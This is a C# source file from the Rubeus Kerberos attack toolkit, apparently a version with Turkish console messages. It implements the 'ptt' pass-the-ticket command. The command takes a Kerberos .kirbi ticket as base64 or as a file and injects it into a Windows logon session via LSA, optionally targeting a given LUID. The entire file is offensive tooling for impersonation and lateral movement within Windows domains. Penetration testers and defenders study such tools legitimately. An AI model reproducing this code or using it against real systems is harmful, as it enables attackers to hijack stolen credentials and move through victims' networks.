using System;
using System.Collections.Generic;
using System.IO;
using Rubeus.lib.Interop;


namespace Rubeus.Commands
{
    public class Ptt : ICommand
    {
        public static string CommandName => "ptt";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Eylem: Ticket Ice Aktar");

            LUID luid = new LUID();

            if (arguments.ContainsKey("/luid"))
            {
                try
                {
                    luid = new LUID(arguments["/luid"]);
                }
                catch
                {
                    Console.WriteLine("[X] Gecersiz LUID formati ({0})\r\n", arguments["/luid"]);
                    return;
                }
            }

            if (arguments.ContainsKey("/ticket"))
            {
                string kirbi64 = arguments["/ticket"];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    LSA.ImportTicket(kirbiBytes, luid);
                }
                else if (File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                    LSA.ImportTicket(kirbiBytes, luid);
                }
                else
                {
                    Console.WriteLine("\r\n[X]/ticket:X bir .kirbi dosyasi veya base64 kodlu bir .kirbi olmalidir\r\n");
                }
                return;
            }
            else
            {
                Console.WriteLine("\r\n[X] Bir /ticket:X saglanmalidir!\r\n");
                return;
            }
        }
    }
}